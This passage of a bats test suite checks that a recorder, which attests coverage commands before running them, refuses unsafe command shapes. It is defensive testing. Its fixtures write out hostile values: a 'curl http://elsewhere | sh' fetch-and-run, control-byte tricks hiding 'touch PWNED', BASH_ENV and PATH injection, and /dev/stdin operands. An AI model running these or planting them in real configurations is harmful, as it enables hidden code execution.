  [ "$status" -eq 0 ] || { echo "a same-size same-mtime rewrite withdrew consent, so something still reads the file: $output"; false; }
  # The discriminator against a build that accepts everything, in the same cell.
  run treason "$R" 'sh ./tools/k8.sh && echo cov2.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
}

@test "a rewritten file is no reason at all, while an edited command and a tree nobody agreed to stay two different ones" {
  # INVERTED IN ROUND 5 on its first leg, KEPT on the other two. A build reusing
  # the changed-command text for a changed bound file passed every criterion of
  # round 2, so the three reasons had to be distinguishable; with the binding
  # retired there is no changed-file reason to distinguish, and the cell asserts
  # that directly - the rewrite produces no refusal - while the two reasons that
  # remain must still not collapse into one, because the human answers them
  # differently (re-read the command, versus read this repository's command for
  # the first time; base-ref-lib.sh:116-121's discipline).
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  set_cov "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  write_script "$R/.harmonia/cov.sh" 'curl http://elsewhere | sh'
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ] || { echo "a rewritten file produced a refusal: $output"; false; }
  [ -z "$output" ] || { echo "a rewritten file produced a reason, so something still reads the tree: $output"; false; }
  # Restored first, so the next refusal has exactly one cause: the command.
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  run treason "$R" 'sh .harmonia/cov.sh && echo other.xml'
  [ "$status" -ne 0 ]
  local edited="$output"
  local other="$BATS_TEST_TMPDIR/other"
  mk_repo "$other"
  run treason "$other" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -ne 0 ]
  local absent="$output"
  [ "$edited" != "$absent" ]
  [[ "$edited" == *"/harmonia:trust"* ]]
  [[ "$edited" == *".harmonia/project.yaml"* ]]
}

@test "a script outside the tree, one reached through a symlink out of it, and a monorepo's own sources are all recordable and all stay consented to" {
  # The ceiling, and it is not optional: the risk the grammar adds is refusing
  # legitimate repositories, and every shape here is a working one. A coverage
  # command may call a script outside the tree, reach one through an in-tree
  # symlink, or change directory first, and none of those may cost consent when
  # anything downstream of them changes.
  #
  # Kept whole from round 4 with its operands respelled for R10 (an interpreter's
  # script operand carries a `/`, so `sh cov.sh` after a cd is `sh ./cov.sh`), and
  # extended: the out-of-tree script is now REWRITTEN between two reads, which is
  # the `apt upgrade` case rounds 1-4 also allowed, and the in-tree symlink is
  # REPOINTED, which they refused.
  local ext="$BATS_TEST_TMPDIR/ext"
  write_script "$ext/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  set_cov "$R" "sh $ext/cov.sh && echo cov.xml"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]                            # a command naming a script outside the tree still records
  run treason "$R" "sh $ext/cov.sh && echo cov.xml"
  [ "$status" -eq 0 ]
  write_script "$ext/cov.sh" '# a system update rewrote it'
  run treason "$R" "sh $ext/cov.sh && echo cov.xml"
  [ "$status" -eq 0 ] || { echo "a system update to a script outside the tree withdrew consent: $output"; false; }
  ln -s "$ext/cov.sh" "$R/link.sh"
  set_cov "$R" 'sh ./link.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'sh ./link.sh && echo cov.xml'
  [ "$status" -eq 0 ]                            # an in-tree name resolving out of the tree records
  write_script "$ext/other.sh" 'curl http://elsewhere | sh'
  ln -sfn "$ext/other.sh" "$R/link.sh"           # ...and the repoint is a commit consent does not cover
  run treason "$R" 'sh ./link.sh && echo cov.xml'
  [ "$status" -eq 0 ] || { echo "repointing an in-tree symlink at other out-of-tree code withdrew consent: $output"; false; }
  mkdir -p "$R/sub"
  write_script "$R/sub/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  printf 'console.log(1)\n' > "$R/sub/src.js"
  set_cov "$R" 'cd sub && sh ./cov.sh && echo sub/cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'cd sub && sh ./cov.sh && echo sub/cov.xml'
  [ "$status" -eq 0 ]
  printf 'console.log(2)\n' > "$R/sub/src.js"    # an ordinary product file, in an ordinary monorepo
  run treason "$R" 'cd sub && sh ./cov.sh && echo sub/cov.xml'
  [ "$status" -eq 0 ]
}

# --- the value the recorder prints is the value it records -------------------
# trust_record prints the command and config-lib.sh:17 strips only SURROUNDING
# blanks, so an interior CR or ESC survives into the printed line, into the digest
# and into the eval: the terminal is left showing a benign tail while the prefix
# runs under recorded consent. Three shipped files name that printing as the
# control, so the refusal is what is pinned - an escaping filter would need a
# second display format kept honest against the first.

control_byte_refused() {   # <label> <printf escape for the byte(s)>
  local label="$1"
  # Interior, never trailing: config-lib.sh:17 would strip a trailing CR before
  # anyone saw it. This is the blocker's own shape - an executable prefix, a `#`,
  # the byte, and then the benign-looking tail the terminal is left showing.
  printf 'coverage: touch PWNED; echo cov.xml #%bnpx vitest run --coverage && echo cov.xml\n' "$2" > "$R/.harmonia/project.yaml"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ] || { echo "$label: the recorder attested a value carrying a control byte"; return 1; }
  [ "$(store_files | wc -l)" -eq 0 ] || { echo "$label: a record landed for a value carrying a control byte"; return 1; }
  printf '%s' "$output" | LC_ALL=C tr -d '\11\12\40-\176\200-\377' > "$BATS_TEST_TMPDIR/control-bytes-printed"
  [ ! -s "$BATS_TEST_TMPDIR/control-bytes-printed" ] || { echo "$label: the recorder printed the control byte it read"; return 1; }
  # Round 3 refuses two byte classes with one rule and two texts, and this is the
  # assertion that keeps them apart: a control byte is a deception story the
  # reader needs told ("your terminal can be left showing another command"),
  # while a pasted U+00A0 is an invisible typo. A build that folds both into one
  # grammar message passes every other assertion here.
  case "$output" in *control*) ;; *) echo "$label: the refusal no longer tells the reader a control byte is what stopped it: $output"; return 1 ;; esac
  return 0
}

# The other half of the byte rule, and the one that REVERSES round 2's verdict.
non_ascii_refused() {   # <label> <printf escape for the byte(s)>
  local label="$1"
  rm -rf "$HARMONIA_HOME"
  # An otherwise attestable value - interpreter, in-tree script, inert tail - so
  # the only thing left to refuse is the byte.
  printf 'coverage: sh .harmonia/cov.sh %b && echo cov.xml\n' "$2" > "$R/.harmonia/project.yaml"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ] || { echo "$label: the recorder attested a value carrying a byte it cannot show a reader honestly"; return 1; }
  [ "$(store_files | wc -l)" -eq 0 ] || { echo "$label: a record landed for a value carrying a non-ASCII byte"; return 1; }
  return 0
}

@test "a coverage value carrying a control byte is never recorded, a tabbed one is not either, and every byte over 0x7e is refused by the same rule" {
  control_byte_refused CR  '\015'
  control_byte_refused ESC '\033[2K'
  control_byte_refused BS  '\010\010\010'
  control_byte_refused SOH '\001'
  control_byte_refused DEL '\177'
  # TAB LEAVES THE BYTE CLASS IN ROUND 5, and it is the specification that moved.
  # Rounds 2-4 exempted it on the argument that it cannot return the cursor or
  # erase a line, which is true and is not the whole question: the 1024-byte cap
  # is written as a READING bound - what a person can take in before agreeing -
  # and a byte worth eight columns makes 1024 bytes into 8192, measured at 83
  # wrapped lines with the payload scrolled off a 24-line terminal. A cap that
  # cannot bound what is on screen is not the control the byte rule needs beside
  # it. The refusal keeps the control-byte text, because "your terminal can be
  # left showing another command" is exactly the story a TAB tells too.
  write_script "$R/.harmonia/tab.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  rm -rf "$HARMONIA_HOME"
  printf 'coverage: sh\t.harmonia/tab.sh && echo cov.xml\n' > "$R/.harmonia/project.yaml"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ] || { echo "a value carrying a TAB was recorded, and 1024 bytes of TAB is 8192 columns - the byte cap is a reading bound and cannot be one when a byte can be eight"; false; }
  [ "$(store_files | wc -l)" -eq 0 ]
  case "$output" in *control*) ;; *) echo "the TAB refusal does not tell the reader a control byte stopped it: $output"; false ;; esac
  run treason "$R" "$(printf 'sh\t.harmonia/tab.sh && echo cov.xml')"
  [ "$status" -ne 0 ]
  # The control that keeps the class from being "refuse everything": the same
  # value with a space where the TAB was records and reads back.
  set_cov "$R" 'sh .harmonia/tab.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'sh .harmonia/tab.sh && echo cov.xml'
  [ "$status" -eq 0 ]
  # REVERSED FROM ROUND 2, and it is the specification that moved rather than a
  # test being loosened. Round 2 asked one question - can this byte make the
  # terminal show a command other than the one that runs - answered it "no" for é
  # and ç, and shipped a class of C0 plus DEL. The review then recorded, printed
  # and RAN U+202E (Trojan Source, CVE-2021-42574, which reorders the rendered
  # line in any renderer implementing the bidi algorithm), U+0085, U+009B and
  # U+200B: every one of them is >= 0x80 in UTF-8, so every one of them was
  # outside the class by the same argument that let é through. Round 3 asks a
  # different question - can the recorder print this value honestly - and refuses
  # every byte outside 0x20-0x7e plus TAB. The bidi and format characters then
  # die on the same rule as é, with no list of codepoints to keep in sync, and
  # the declared cost is that a comment carrying é can no longer be attested.
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  non_ascii_refused utf8 '\303\251\303\247'
  non_ascii_refused rlo  '\342\200\256'
  non_ascii_refused nel  '\302\205'
  non_ascii_refused csi  '\302\233'
  non_ascii_refused zwsp '\342\200\213'
  non_ascii_refused nbsp '\302\240'
}

@test "a value whose only byte outside the class is a newline is refused, and the two ways of writing that test are not the same" {
  # The byte rule is asked by deleting the printable class and looking at what is
  # left, and the deletion runs inside a command substitution - which strips
  # trailing newlines. So a value whose ONLY out-of-class bytes are LFs leaves an
  # empty answer, passes the byte rule, and is then split on those LFs into words:
  # `sh ./cov.sh<LF>touch /tmp/x` is admitted as one part by the build in the tree
  # today, measured through trust_refs.
  #
  # THE ORDER OF THE TWO FILTERS IS THE FIX AND THE WRONG ORDER IS SILENT.
  # Deleting the printable class first and then mapping LF to a printable leaves
  # one character standing, which is a refusal; mapping first and deleting second
  # turns the LF into a byte the delete then removes, which leaves the hole
  # exactly where it was and looks like the same edit in a diff. This cell is what
  # tells those two builds apart, so it is worth more than its four lines.
  #
  # Asked at trust_refs rather than through a project.yaml, because config-lib
  # reads one physical line and cannot deliver a newline to the recorder. It is a
  # hole in the predicate, and the predicate is what the sweep and every criterion
  # in this round quantify over.
  local reason rc v
  # `&& rc=0 || rc=$?` rather than a bare `rc=$?` on the next line: a failing
  # assignment is a failing command, and under bats' errexit it takes the body
  # down before the assertion that wanted the failure ever runs.
  refs() { reason="$(bash -c 'set -u; . "$1" || exit 127; trust_refs "$2"' _ "$TRUST" "$1" 2>&1)" && rc=0 || rc=$?; }
  v="$(printf 'sh ./cov.sh\ntouch /tmp/zqnl')"
  refs "$v"
  [ "$rc" -ne 0 ] || { echo "a value carrying a newline was admitted, and the splitter then read the newline as a word separator - so a second command nobody agreed to is inside an admitted string"; false; }
  # The byte the reader is told about is the one that is there: a newline is a
  # control byte and the refusal keeps that text, the same as TAB's.
  case "$reason" in *0x0a*) ;; *) echo "the refusal does not name the byte that stopped it: $reason"; false ;; esac
  case "$reason" in *control*) ;; *) echo "the newline refusal does not tell the reader a control byte stopped it: $reason"; false ;; esac
  # A TRAILING newline, which is the byte a command substitution eats - so the
  # value has to be built with a sentinel and the sentinel stripped, or this cell
  # measures its own construction rather than the build. That is the same trap the
  # predicate itself fell into, one level up.
  v="$(printf 'sh ./cov.sh\n'; printf X)"; v="${v%X}"
  refs "$v"
  [ "$rc" -ne 0 ] || { echo "a value with a trailing newline was admitted, so the byte test still cannot see a byte at the end of the string"; false; }
  # The control, in the same cell: the same value with a space where the newline
  # was records, so this is a byte rule and not a refusal of anything long.
  refs 'sh ./cov.sh touch /tmp/zqnl'
  [ "$rc" -eq 0 ] || { echo "the same value with a space where the newline was is refused, so this is not a byte rule: $reason"; false; }
}

# --- the refusal bodies, pinned by what they do ------------------------------
# `Uncovered changed lines: none` is not evidence that any of these ran: kcov
# credits the physical line when the `case` or `||` dispatch executes, so a body
# sharing that line reports covered while never executing. Five did. Nothing below
# asserts a coverage number; each cell drives one body and asserts what it does.

@test "trust_key refuses a bare dash rather than letting cd answer OLDPWD for it" {
  # trust_key's own first line, and the reason it is pinned at the function rather than
  # through the CLI: with that arm deleted, `record --repo -` still refuses, two
  # lines below, because `cd -` prints its destination into the command
  # substitution and the key then contains a newline. The CLI cannot see this arm.
  # `cd -x` fails on its own, so only a BARE dash discriminates (2026-07-31: a
  # path test and cd disagree on a dash-leading value, and `cd --` does not
  # neutralize the bare form).
  run bash -c 'set -u; . "$1" || exit 127; type -t trust_key' _ "$TRUST"
  [ "$status" -eq 0 ]
  [ "$output" = function ]                       # renamed away, every cell below exits 127 and asserts nothing
  local alpha="$BATS_TEST_TMPDIR/alpha" beta="$BATS_TEST_TMPDIR/beta"
  mkdir -p "$alpha" "$beta"
  run bash -c 'set -u; . "$1" || exit 127; cd "$2" && cd "$3" && trust_key -' _ "$TRUST" "$alpha" "$beta"
  [ "$status" -ne 0 ]
  [ "$status" -ne 127 ]
  [ "$output" != "$(cd "$alpha" && pwd -P)" ]    # never the directory `cd -` would have returned to
  [ "$output" != "$(cd "$beta" && pwd -P)" ]
  run bash -c 'set -u; . "$1" || exit 127; cd "$2" && trust_key -x' _ "$TRUST" "$beta"
  [ "$status" -ne 0 ]
  [ "$status" -ne 127 ]
  run bash "$TRUST" record --repo -x
  [ "$status" -ne 0 ]
  [ "$(store_files | wc -l)" -eq 0 ]
}

@test "an unresolvable tree, a missing record and a record nothing can read refuse differently, and a named pipe does not hang the reader" {
  set_cov "$R" 'echo cov.xml'
  run treason "$BATS_TEST_TMPDIR/nope/tree" 'echo cov.xml'
  [ "$status" -ne 0 ]
  [ "$status" -ne 127 ]
  local unresolvable="$output"
  [[ "$unresolvable" == *".harmonia/project.yaml"* ]]
  [[ "$unresolvable" == *"/harmonia:trust"* ]]
  [[ "$unresolvable" != *"trust.sh"* ]]
  run treason "$R" 'echo cov.xml'
  [ "$status" -ne 0 ]
  local absent="$output"
  # A tree that cannot be resolved and a tree nobody has agreed to are different
  # situations for the human reading the line: one is a wrong path, the other is
  # an unread command.
  [ "$unresolvable" != "$absent" ]
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  local rec; rec="$(store_files)"
  [ -n "$rec" ]
  rm -f "$rec"; mkdir -p "$rec"                  # the record's own path, taken by something sed cannot read
  run treason "$R" 'echo cov.xml'
  [ "$status" -ne 0 ]
  [ "$output" != "$absent" ]                     # an unreadable record is not a missing one
  [[ "$output" == *"/harmonia:trust"* ]]
  rmdir "$rec"
  # A FIFO is the only shape that separates the `[ -f ]` test from a bare `[ -e ]`:
  # a directory produces the same message either way, while `sed` on a named pipe
  # BLOCKS. This cell is a hang test as much as a refusal test.
  mkfifo "$rec"
  run timeout 5 bash -c 'set -u; . "$1" || exit 127; trust_reason "$2" "$3"' _ "$TRUST" "$R" 'echo cov.xml'
  [ "$status" -ne 124 ]
  [ "$status" -ne 0 ]
  [ "$status" -ne 127 ]
  rm -f "$rec"
}

@test "the recorder refuses when its record cannot land, and never records a repository path containing a newline" {
  set_cov "$R" 'echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]                            # the control
  local rec; rec="$(store_files)"
  [ -n "$rec" ]
  rm -f "$rec"; mkdir -p "$rec"                  # the write cannot land at that path
  run bash "$TRUST" record --repo "$R"
  # The write is judged by reading the record back through the very predicate the
  # gate asks, because a redirect's own exit status cannot say whether the file
  # landed (2026-08-01 learning).
  [ "$status" -ne 0 ]
  [[ "$output" != *"consent recorded"* ]]        # never a success line over a record that is not there
  rmdir "$rec"
  # The record is line-oriented, so a path carrying a newline could forge a second
  # coverage-sha256: line inside it (bin/workspace.sh:154's discipline).
  local weird="$BATS_TEST_TMPDIR/$(printf 'we\nird')"
  mkdir -p "$weird/.harmonia"
  set_cov "$weird" 'echo cov.xml'
  local before; before="$(store_files | wc -l)"
  run bash "$TRUST" record --repo "$weird"
  [ "$status" -ne 0 ]
  [[ "$output" != *"consent recorded"* ]]
  [ "$(store_files | wc -l)" -eq "$before" ]     # nothing landed for a path nothing can safely record
}

# --- the grammar: which commands can be attested at all -----------------------
# Two rounds failed the same way. Deciding which tokens of an arbitrary shell
# command name executable code is unbounded, and each rewrite of that predicate
# shipped the next round's blocker: the last one bound the interpreter and not the
# script for `/bin/sh cov.sh`, and bound NOTHING for `env`, `exec`, `command`,
# `time`, `nohup`, `.`, `source`, `VAR=1 ./x.sh`, `sh <x.sh` and `sh -c '…'` -
# each accepted by the recorder, each running an in-repo file, each surviving that
# file's rewrite under recorded consent (2026-08-10 learning: when every rewrite
# of a predicate ships the next round's blocker, shrink the promise instead of the
# mechanism).
#
# So the recordable shapes are enumerated and there is no fallback arm: a leading
# `cd`, an interpreter word, a segment head carrying a `/`, an inert word. Anything
# else is REFUSED AT RECORD TIME, where a human is standing there to read the
# refusal, instead of silently admitted while binding nothing. The failure
# direction inverts, and that is the whole of the change.
#
# The accept side is tested as hard as the reject side and for a harder reason:
# the risk this grammar adds is refusing legitimate repositories, and a build that
# refuses everything satisfies every reject cell here.

grammar_tree() {   # one file per shape, so a refusal is about the SPELLING and never a missing file
  RAN="$BATS_TEST_TMPDIR/RECORDER-RAN"
  EXT="$BATS_TEST_TMPDIR/ext"
  mkdir -p "$R/sub" "$R/scripts" "$R/node_modules/.bin" "$R/adir" "$EXT"
  # Every script touches the same sentinel: that is how the accept cells prove the
  # recorder attested the value instead of running it, the way
  # skills/onboard/CERTIFY.md:7 runs a coverage value it is certifying.
  write_script "$R/.harmonia/cov.sh"          "touch $RAN"
  write_script "$R/scripts/cov.sh"            "touch $RAN"
  write_script "$R/sub/cov.sh"                "touch $RAN"
  write_script "$R/node_modules/.bin/tool"    "touch $RAN"
  write_script "$EXT/cov.sh"                  "touch $RAN"
  printf 'plain\n' > "$R/cov.tpl"             # a regular file, for `cd` at a non-directory
  ln -sfn "$EXT" "$R/esc"                     # an in-tree name that leaves the tree
  ln -sfn "$EXT/cov.sh" "$R/link.sh"
  # Round 4's shapes. Each exists so that a refusal is about the spelling and not
  # about a missing file: `cd -P` has a real directory to name, `cd alias/../deep`
  # has a file at BOTH the path readlink -f reaches and the one the shell's own
  # logical cd reaches, and every head below is a file that is really there.
  mkdir -p "$R/-P" "$R/xy/zz" "$R/xy/deep" "$R/deep"
  write_script "$R/-P/cov.sh"                 "touch $RAN"
  write_script "$R/xy/deep/cov.sh"            "touch $RAN"   # what `readlink -f` reaches
  write_script "$R/deep/cov.sh"               "touch $RAN"   # what bash's logical `cd` reaches
  ln -sfn xy/zz "$R/alias"
  printf '#!/bin/sh\nexec "$@"\n' > "$EXT/launch"            # written here, not borrowed from /usr/bin/env
  chmod +x "$EXT/launch"
  ln -sfn "$EXT/launch" "$R/sh"               # an in-tree name whose BASENAME is on the interpreter list
  ln -sfn "$EXT/launch" "$R/envlink"          # ...and one whose basename is not
  ln -sfn "$EXT/cov.sh" "$R/node_modules/.bin/vitest"   # an in-tree tool that is a symlink out of the tree
  # ROUND 5. The two assignment attacks need their payload AND the file the old
  # first-word rule resolved the assignment word to, or the refusal below would be
  # about a missing file rather than about the `=`. `V+=x/y` resolves to the file
  # `V+=x/y`; `BASH_ENV+=./evil.sh` resolves through the directory `BASH_ENV+=.`,
  # and the payload it preloads is `evil.sh` at the root - reproduced running.
  mkdir -p "$R/V+=x" "$R/BASH_ENV+=." "$R/CDPATH+=."
  write_script "$R/V+=x/y"                    "touch $RAN"
  write_script "$R/BASH_ENV+=./evil.sh"       "touch $RAN"
  write_script "$R/CDPATH+=./sub"             "touch $RAN"
  write_script "$R/evil.sh"                   "touch $RAN"
  mkdir -p "$R/covdir"                        # an interpreter operand that is a directory
  write_script "$R/covdir/__main__.py"        "touch $RAN"
  # ROUND 6. Three files that exist so that a refusal is about the SPELLING and
  # never about a missing file: a repository tool whose basename is on the card
  # (`node_modules/.bin/sh`, which a basename match would take as an interpreter),
  # the wrapper every JavaScript repository ships, and the gradle wrapper the
  # round refuses by name and re-admits one word later.
  write_script "$R/node_modules/.bin/sh"      "touch $RAN"
  write_script "$R/gradlew"                   "touch $RAN"
  write_script "$R/tools/cov.py"              "touch $RAN"
  write_script "$R/tools/x.sh"                "touch $RAN"   # the relative operand the /./ guard names
}

outside_grammar() {   # <label> <coverage value>: refused, with nothing written and nothing run
  local label="$1" val="$2"
  rm -rf "$HARMONIA_HOME" "$RAN"
  set_cov "$R" "$val"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ] || { echo "$label: the recorder attested a value outside the grammar: $val"; return 1; }
  [ "$(store_files | wc -l)" -eq 0 ] || { echo "$label: a record landed for a refused value: $val"; return 1; }
  [ ! -e "$RAN" ] || { echo "$label: the recorder ran the value it was refusing: $val"; return 1; }
  return 0
}

inside_grammar() {   # <label> <coverage value>: recorded, readable back, and never executed
  local label="$1" val="$2"
  rm -rf "$HARMONIA_HOME" "$RAN"
  set_cov "$R" "$val"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ] || { echo "$label: the recorder refused an attestable command ($val): $output"; return 1; }
  [ "$(store_files | wc -l)" -eq 1 ] || { echo "$label: no record landed for an attestable command: $val"; return 1; }
  [ ! -e "$RAN" ] || { echo "$label: the recorder executed the value it was attesting: $val"; return 1; }
  run treason "$R" "$val"
  [ "$status" -eq 0 ] || { echo "$label: the reader does not accept what the recorder just wrote ($val): $output"; return 1; }
  return 0
}

@test "a coverage value outside the recordable shapes is refused while a human is there to read it, and nothing is written" {
  grammar_tree
  # A word in front of the interpreter, and the reason the class goes whole rather
  # than one arm per spelling. Measured on the build these tests were written
  # against: the first six DO bind .harmonia/cov.sh today, because the rule scans
  # every token of the value looking for an interpreter word - and that scan is the
  # unbounded predicate this round retires. Its replacement reads the first word of
  # a segment, under which `env`, `exec`, `command`, `time`, `nohup` and an
  # assignment are not classes at all. The first draft of the grammar gave them one
  # anyway, as a fallback that admitted and bound nothing, and the attack ran an
  # in-repo file through every one of them with the recorded binding unchanged. So
  # six of these cells refuse a value that is bound correctly today: that is the
  # cost of dropping the fallback, and it is paid in a refusal a human reads
  # instead of in a class of values nobody can tell apart. `.` and `source` bind
  # nothing even under the scan.
  outside_grammar prefix-env      'env sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar prefix-exec     'exec sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar prefix-command  'command sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar prefix-time     'time sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar prefix-nohup    'nohup sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar prefix-assign   'VAR=1 sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar dot-source      '. .harmonia/cov.sh && echo cov.xml'
  outside_grammar source-word     'source .harmonia/cov.sh && echo cov.xml'
  # An interpreter whose script is not where any rule can read it. `sh -c '…'` and
  # `sh <x.sh` bind the tokens `'sh` and `<` today - neither of which is a file -
  # and both ran their payload under recorded consent. `sh -e cov.sh` binds
  # correctly and `sh -- -x.sh` cannot, because a prefix test cannot tell "still an
  # option" from "the operand": the option form goes as a class rather than by
  # guess, which is also how round 2's dash-leading script name is closed.
  # `python3.12` is a near miss on a closed list, and a refusal beats a quiet
  # downgrade to binding nothing.
  outside_grammar interp-c        "sh -c 'sh .harmonia/cov.sh'"
  outside_grammar interp-opt      'sh -e .harmonia/cov.sh && echo cov.xml'
  outside_grammar interp-ddash    'sh -- .harmonia/cov.sh && echo cov.xml'
  outside_grammar interp-none     'sh && echo cov.xml'
  outside_grammar interp-nearmiss 'python3.12 .harmonia/cov.sh && echo cov.xml'
  outside_grammar redirect-in     'sh < .harmonia/cov.sh && echo cov.xml'
  outside_grammar redirect-out    'sh .harmonia/cov.sh > out && echo cov.xml'
  # ROUND 5, R10: an interpreter's script operand carries a `/`. A slash-less
  # operand is PATH-searched - `bash cov.sh` with no cov.sh in the tree runs a
  # file the value does not name, reaching node_modules/.bin under npm exec or
  # direnv - and R9, which used to close that, needed the filesystem and is
  # retired with the binding. Decidable from the string, one character from the
  # developer, and it reads better: a path is what it is.
  outside_grammar interp-bare-operand  'sh cov.sh && echo cov.xml'
  outside_grammar interp-bare-bash     'bash cov.sh && echo cov.xml'
  outside_grammar interp-bare-resolves 'node cov && echo cov.xml'
  # R8's cut names, as cells rather than only as a set-equality probe. The card
  # test below measures the admitted set against the card and would pass a build
  # that put `zsh` back on BOTH - the card is held equal across five files, not
  # against any fixed content - so the names the round removed are named here too.
  # Each one is a claim about an argument convention this repository states, and
  # five fewer names is five fewer claims.
  outside_grammar interp-zsh      'zsh ./scripts/cov.sh && echo cov.xml'
  outside_grammar interp-ksh      'ksh ./scripts/cov.sh && echo cov.xml'
  outside_grammar interp-perl     'perl ./scripts/cov.sh && echo cov.xml'
  outside_grammar interp-ruby     'ruby ./scripts/cov.sh && echo cov.xml'
  outside_grammar inert-colon     ': && sh .harmonia/cov.sh && echo cov.xml'
  # ROUND 5, R11: a first word carrying a `/` whose BASENAME is on the card
  # answers to the interpreter's rules. Without it `sh -c x` refuses while
  # `/bin/sh -c x` records - the same program, decided by spelling - and
  # `sh ./gen.sh | /bin/sh` runs bytes no word in the value names. Held on the
  # basename because the basename is what the reader reads.
  outside_grammar head-interp-opt   '/bin/sh -c payload && echo cov.xml'
  outside_grammar head-interp-noarg 'sh ./gen.sh | /bin/sh'
  outside_grammar head-interp-bare  '/bin/sh cov.sh && echo cov.xml'
  #
  # ROUND 6, HALF TWO OF THE DELETION: the card is matched on the WHOLE word, so
  # an interpreter cannot be spelled with a path. R11 held these to the operand
  # rules and admitted them once the operand was well formed; the nine literals
  # refuse them outright. These three cells are the ones a build that deleted the
  # `/`-carrying class but kept the basename test still records - measured, all
  # three - so they are what makes the second edit visible on its own.
  outside_grammar interp-abs        '/bin/sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar interp-abs-bash   '/bin/bash .harmonia/cov.sh && echo cov.xml'
  outside_grammar interp-abs-python '/usr/bin/python3 .harmonia/cov.sh && echo cov.xml'
  # ...and the in-tree spelling of the same thing, which is the whole reason the
  # basename test cannot survive: a repository ships a file called `sh`, and under
  # a basename match the repository decides what the card's largest class runs.
  # `./sh ./cov.sh` is the plainest admitted value in the round with one `./`
  # added, and the fixture's `./sh` is a real executable so the refusal is about
  # the spelling.
  outside_grammar interp-repo-sh    './sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar interp-repo-nested './node_modules/.bin/sh .harmonia/cov.sh && echo cov.xml'
  #
  # ROUND 6, HALF ONE: a `/`-carrying first word is not a class at all. Round 5
  # made it one and left its later words unconstrained, which re-entered four of
  # its own rules one word to the left - each of the four below was refused in the
  # spelling it was written against and recorded twelve characters later, and the
  # first ran the repository's own `fakebin/sh` end to end under recorded consent.
  # A build that made the card exact but kept the class still records all of them.
  outside_grammar launch-path       '/usr/bin/env PATH=fakebin sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar launch-bash-env   '/usr/bin/env BASH_ENV=./evil.sh bash .harmonia/cov.sh && echo cov.xml'
  outside_grammar launch-chdir      '/usr/bin/env --chdir=/etc sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar launch-bare-arg   '/usr/bin/env sh cov.sh && echo cov.xml'
  outside_grammar launch-pipe-tail  'sh ./gen.sh | /usr/bin/env sh'
  # The same class spelled from inside the fixture rather than from /usr/bin, so
  # no cell here depends on which coreutils this machine has: `$EXT/launch` is a
  # two-line `exec "$@"` written by grammar_tree, and it is what round 5 recorded
  # as `head-launcher`.
  outside_grammar head-launcher     "$EXT/launch sh .harmonia/cov.sh && echo cov.xml"
  outside_grammar tail-launcher     "sh .harmonia/cov.sh && $EXT/launch sh scripts/cov.sh && echo cov.xml"
  # A repository file as the program, by every spelling round 5 admitted: a script
  # at a relative path, one at an absolute path inside the tree, a tool under
  # node_modules/.bin, an in-tree name that leaves the tree, and one that is not
  # there at all. `./gradlew` and `./node_modules/.bin/vitest` are the sharpest
  # cost this round adds and they are refused here rather than argued about: the
  # remedy is one word in front, and it has its own accept cells below.
  outside_grammar path-head         './scripts/cov.sh && echo cov.xml'
  outside_grammar path-abs-in       "$R/scripts/cov.sh && echo cov.xml"
  outside_grammar path-tool         './node_modules/.bin/tool --coverage && echo cov.xml'
  outside_grammar path-gradlew      './gradlew jacocoTestReport && echo cov.xml'
  outside_grammar head-symlink-any  './envlink sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar tool-symlink-out  './node_modules/.bin/vitest run --coverage && echo cov.xml'
  outside_grammar path-absent       './scripts/late.sh && echo cov.xml'
  #
  # ROUND 6's ONE ADDED RULE, at the operand rather than the first word: a script
  # operand under /dev/ or /proc/ hands the interpreter bytes that arrived from
  # somewhere else. `sh ./gen.sh | sh /dev/stdin` records on round 5's build and
  # runs generated bytes - measured, with a sentinel - and bin/trust.sh already
  # claims that class is closed for the `/bin/sh` spelling, so deleting the
  # `/`-carrying class without this leaves that sentence actively wrong rather
  # than merely stale. Those are the only two filesystems that hand a program its
  # own input as a path, which is why this is a rule about two prefixes and not a
  # judgement about paths.
  outside_grammar dev-stdin         'sh /dev/stdin && echo cov.xml'
  outside_grammar dev-fd            'sh /dev/fd/0 && echo cov.xml'
  outside_grammar proc-fd           'sh /proc/self/fd/0 && echo cov.xml'
  outside_grammar dev-pipeline      'sh ./gen.sh | sh /dev/stdin'
  outside_grammar dev-bash          'bash /dev/stdin && echo cov.xml'
  #
  # ROUND 7: THE RULE ABOVE TESTS TWO STRINGS AND THE HAZARD IS TWO FILESYSTEMS.
